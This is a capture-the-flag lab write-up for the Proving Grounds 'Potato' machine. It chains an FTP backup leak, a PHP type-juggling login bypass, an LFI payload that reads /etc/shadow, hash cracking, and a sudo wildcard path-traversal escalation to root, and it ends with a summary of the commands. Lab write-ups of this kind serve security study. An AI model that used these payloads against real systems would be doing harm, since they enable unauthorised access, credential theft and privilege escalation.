# Potato - Proving Grounds Practice

> **Kill Chain Summary**: Anonymous FTP Backup Leak (index.php.bak) -> PHP == Loose Comparison Bypass (password[]) -> Admin Panel LFI to read /etc/shadow -> John the Ripper Hash Cracking -> SSH as webadmin -> Sudo Wildcard Path Traversal (/bin/nice /notes/*) -> Root Shell.

| Property | Value |
|---|---|
| **Target Name** | Potato |
| **Platform** | Proving Grounds Practice |
| **OS** | Linux (Ubuntu 20.04) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | ProFTPd Backup Extraction, PHP Type Juggling (Loose Comparison Bypass), LFI / Path Traversal (/etc/shadow), Hash Cracking (John the Ripper), Sudo Wildcard Path Traversal |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We initiate reconnaissance with a full TCP port scan:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp $IP
```

![[Pasted image 20260531233344.png]]

**Open Ports Summary:**

| Port | Service | Version | Key Observation / Vector |
|---|---|---|---|
| **22/tcp** | SSH | OpenSSH 8.2 | Potential access vector once valid credentials are recovered |
| **80/tcp** | HTTP | Apache httpd 2.4.41 | Web server hosting an administrative login portal at /admin |
| **2112/tcp** | FTP | ProFTPd | Anonymous access allowed: source code backup files leaked |

---

### 1.2 Web Enumeration (Port 80)

Browsing to `http://$IP/` displays a default landing page. Standard checks for `robots.txt` and `sitemap.xml` yielded no sensitive endpoints:

![[Pasted image 20260531233828.png]]
![[Pasted image 20260531233942.png]]

Running directory fuzzing with `gobuster`:

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt
```

![[Pasted image 20260531234236.png]]

The scan discovers an administrative login page located at `/admin`:

![[Pasted image 20260531234325.png]]

> Note on initial attempts: Authentication bypass via basic SQL injection payloads (`' OR 1=1 --`) on `/admin` failed because authentication is handled in PHP code rather than a database query.

![[Pasted image 20260531234612.png]]
![[Pasted image 20260601000445.png]]

---

### 1.3 FTP Enumeration (Port 2112)

Connecting to the non-standard ProFTPd service on port 2112 using anonymous credentials (`anonymous` / `anonymous`):

```bash
ftp $IP 2112
# Connected to 192.168.x.x
# Name: anonymous
# 230 Anonymous access granted, restrictions apply.
```

![[Pasted image 20260601135933.png]]
![[Pasted image 20260601140017.png]]

Listing directory contents reveals two files:
- `welcome.msg`: Banner message.
- `index.php.bak`: Leaked backup file containing the PHP source code of the admin login page.

![[Pasted image 20260601163926.png]]
![[Pasted image 20260601164037.png]]

#### Source Code Analysis (index.php.bak)

Inspecting `index.php.bak` exposes the authentication verification logic:

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

if ($username == "admin" && $password == "potato") {
    $_SESSION['admin'] = true;
    header("Location: dashboard.php");
}
?>
```

The script uses PHP loose comparison (`==`) rather than strict comparison (`===`). In PHP, comparing an array against a string using `==` can lead to type juggling quirks. Passing `password[]=` sends an array, bypassing the string comparison check.

---

## 2. Initial Access

### 2.1 Admin Authentication Bypass (PHP Type Juggling)

In Burp Suite, intercept the POST request sent to `/admin/index.php` and modify the body to pass `password` as an array:

```http
POST /admin/index.php HTTP/1.1
Host: 192.168.x.x
Content-Type: application/x-www-form-urlencoded

username=admin&password[]=
```

![[Pasted image 20260601170331.png]]
![[Pasted image 20260601170409.png]]

The server accepts the request and redirects to the authenticated dashboard.

---

### 2.2 Local File Inclusion (LFI) via Admin Log Viewer

Inside the admin dashboard, a log viewer functionality allows administrators to view system log files:

![[Pasted image 20260607161903.png]]

Inspecting the HTTP traffic in Burp Suite reveals that the file path is transmitted via a parameter in the POST body:

![[Pasted image 20260607162009.png]]

Testing directory traversal by setting the parameter to `../../../../../../etc/passwd`:

![[Pasted image 20260607162058.png]]

The file `/etc/passwd` is successfully returned.

#### Extracting shadow File

Because the web process has sufficient read permissions, we request `/etc/shadow`:

```text
POST /admin/dashboard.php HTTP/1.1
...

file=../../../../../../etc/shadow
```

The response reveals the password hash for `webadmin`:

```text
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:18550:0:99999:7:::
```

---

### 2.3 Password Hash Cracking (John the Ripper)

The `$1$` prefix denotes an MD5-crypt hash. We save the hash and crack it with `john` and `rockyou.txt`:

```bash
echo '$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 256/256 AVX2 8x3])
dragon           (webadmin)
```

Recovered credentials: `webadmin:dragon`

---

### 2.4 SSH Access and User Flag

With recovered credentials, we log in over SSH:

```bash
ssh webadmin@$IP
# Password: dragon
webadmin@serv:~$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin)

webadmin@serv:~$ cat local.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Sudo Permissions Enumeration

Checking sudo permissions for `webadmin`:

```bash
sudo -l
```

```text
User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```

#### Rule Breakdown

```text
(ALL : ALL)          -> Can execute as any user, including root
/bin/nice            -> The allowed binary is /bin/nice (adjusts process priority)
/notes/*             -> The target argument must match the wildcard pattern starting with /notes/
```

### 3.2 Exploiting Sudo Wildcard Path Traversal

The sudo configuration specifies `/notes/*`. Sudo validates that the argument begins with the literal string `/notes/`, but it does not resolve canonical path traversal (`..`) sequences before checking the match.

If we pass `/notes/../home/webadmin/root.sh`:
1. Sudo checks: Does the argument match `/notes/*`? Yes, it begins with `/notes/`.
2. Sudo executes: `/bin/nice /notes/../home/webadmin/root.sh` as root.
3. The filesystem resolves `/notes/../` to `/`, resulting in the execution of `/home/webadmin/root.sh` with root privileges.

#### Execution and Root Shell

1. Create a script spawning `/bin/bash`:
   ```bash
   echo "/bin/bash" > /home/webadmin/root.sh
   chmod +x /home/webadmin/root.sh
   ```

2. Execute via `/bin/nice` with path traversal:
   ```bash
   sudo /bin/nice /notes/../home/webadmin/root.sh
   ```

```bash
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root)

root@serv:/home/webadmin# cat /root/proof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# PHP Type Juggling Bypass (Burp POST parameter)
username=admin&password[]=

# Read /etc/shadow via LFI
../../../../../../etc/shadow

# Crack MD5-crypt hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Sudo wildcard path traversal escape
echo "/bin/bash" > /tmp/root.sh && chmod +x /tmp/root.sh
sudo /bin/nice /notes/../tmp/root.sh
```

---

## 5. Key Takeaways and Lessons Learned

1. **Cross-Service Reconnaissance:** Web application access was blocked until the backup file on FTP (port 2112) was found. Correlating findings across all open ports is essential before going too deep into a single service.
2. **Comprehensive Feature Testing:** In initial enumeration, missing the LFI occurred because not every feature in the admin panel was exercised in Burp Suite. Once inside an administrative interface, test every action and observe the parameters sent in HTTP history.
3. **LFI Direct to Shadow:** When LFI enables reading `/etc/shadow`, attempting complex log poisoning or PHP wrapper RCE is unnecessary. Checking whether password hashes crack quickly with `rockyou.txt` provides direct SSH access.
4. **Sudo Wildcard ( * ) Vulnerabilities:** Wildcards in `/etc/sudoers` paths (such as `/folder/*`) can be traversed using `..` directory references unless canonicalization is enforced.

---

### Tags
#linux #web #php #type-juggling #ftp #path-traversal #lfi #shadow #john #hash-cracking #sudo #wildcard #easy #pg-practice #rooted
